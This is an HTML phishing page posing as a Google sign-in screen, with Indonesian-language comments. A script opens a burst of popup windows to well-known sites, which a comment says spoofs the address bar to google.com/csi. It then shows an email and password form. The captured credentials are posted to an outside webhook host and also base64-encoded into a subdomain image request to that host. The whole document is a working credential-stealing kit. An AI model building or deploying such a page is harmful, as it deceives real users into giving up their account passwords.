<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>google.com</title>
  <style>
    html, body { margin:0; height:100%; background:#fff; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif; display:grid; place-items:center; }
    .card { background:#fff; padding:24px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.1); max-width:600px; text-align:center; }
    h1 { margin:0 0 8px; font-size:32px; color:#4285f4; }
    p { margin:8px 0 20px; font-size:16px; color:#5f6368; }
    .img-btn { 
      width:100px; height:100px; cursor:pointer; border-radius:50%; 
      box-shadow:0 8px 32px rgba(66,133,244,0.5); transition:transform 0.2s;
      filter: drop-shadow(0 0 10px #4285f4);
    }
    .img-btn:hover { transform:scale(1.12); }
    .loader { width:40px; height:40px; border:4px solid #dadce0; border-top:4px solid #4285f4; border-radius:50%; animation:spin 1s infinite linear; margin:20px auto; display:none; }
    @keyframes spin { to { transform:rotate(360deg); } }
    .login-form { margin-top:20px; display:none; }
    .login-form input { width:100%; padding:12px; margin:8px 0; border-radius:8px; border:1px solid #dadce0; font-size:16px; }
    .login-form button { width:100%; padding:14px; background:#4285f4; color:#fff; border:none; border-radius:8px; font-weight:bold; font-size:18px; cursor:pointer; }
  </style>
</head>
<body>
  <div class="card">
    <div class="google-logo" style="font-size:96px;font-weight:400;letter-spacing:-4px;margin-bottom:40px;">
      <span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span>
    </div>
    <h1>Google Sign In</h1>
    <p id="instruction">Tap icon to verify your account...</p>

    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgcj0iNDUiIGZpbGw9IiM0Mjg1ZjQiLz48L3N2Zz4=" 
         alt="Verify" 
         class="img-btn" 
         id="verifyImg">

    <div class="loader" id="loader"></div>
    <div id="status"></div>

    <!-- LOGIN FORM (langsung muncul setelah burst) -->
    <div class="login-form" id="loginForm">
      <p>Sign in to continue to Google</p>
      <form action="https://keen-unicorn-32.webhook.cool" method="POST">
        <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Next</button>
      </form>
    </div>
  </div>

  <script>
    // CONFIG
    const TARGETS = [
      "https://www.google.com/csi", // Ini yang spoof address bar ke google.com/csi
      "https://www.wikipedia.org/",
      "https://www.youtube.com/robots.txt",
      "https://www.apple.com/contact/",
      "https://www.microsoft.com/",
      "https://www.amazon.com/robots.txt",
      "https://www.instagram.com/",
      "https://www.yahoo.com/",
      "https://www.reddit.com/robots.txt",
      "https://developer.mozilla.org/"
    ];

    const OOB = "keen-unicorn-32.webhook.cool";

    const statusEl = document.getElementById("status");
    const loader = document.getElementById("loader");
    const verifyImg = document.getElementById("verifyImg");
    const instruction = document.getElementById("instruction");
    const loginForm = document.getElementById("loginForm");

    let handles = [];

    function openBurst(count = 10) {
      const h = [];
      let opened = 0;

      for (let i = 0; i < count; i++) {
        const url = TARGETS[i % TARGETS.length];
        const delay = i * 50 + Math.floor(Math.random() * 30);

        setTimeout(() => {
          try {
            const win = window.open(url, "_blank");
            if (win) {
              h.push(win);
              opened++;
            }
          } catch (_) {}
        }, delay);
      }

      setTimeout(() => {
        statusEl.innerHTML = "Verification complete.";
        loader.style.display = 'none';
        instruction.textContent = "Enter your credentials";

        // LANGSUNG TAMPILKAN LOGIN FORM (NO STEP 2)
        loginForm.style.display = 'block';

        // Cleanup tabs (biar address bar tetap di google.com/csi)
        setTimeout(() => {
          handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_) {} });
        }, 1500);

        handles = h;
      }, count * 55 + 200);

      return h;
    }

    // OOB EXFIL SAAT SUBMIT FORM
    loginForm.addEventListener("submit", function(e) {
      const email = e.target.email.value;
      const password = e.target.password.value;
      if (email || password) {
        const data = btoa(`${email}|${password}`).replace(/=/g, '').substring(0, 500);
        new Image().src = `https://${data}.${OOB}`;
      }
    });

    // KLIK SEKALI â†’ BURST + LANGSUNG TAMPILKAN FORM
    verifyImg.addEventListener("click", () => {
      statusEl.textContent = "Verifying device...";
      loader.style.display = 'block';
      openBurst(10);
    });
  </script>
</body>
</html>
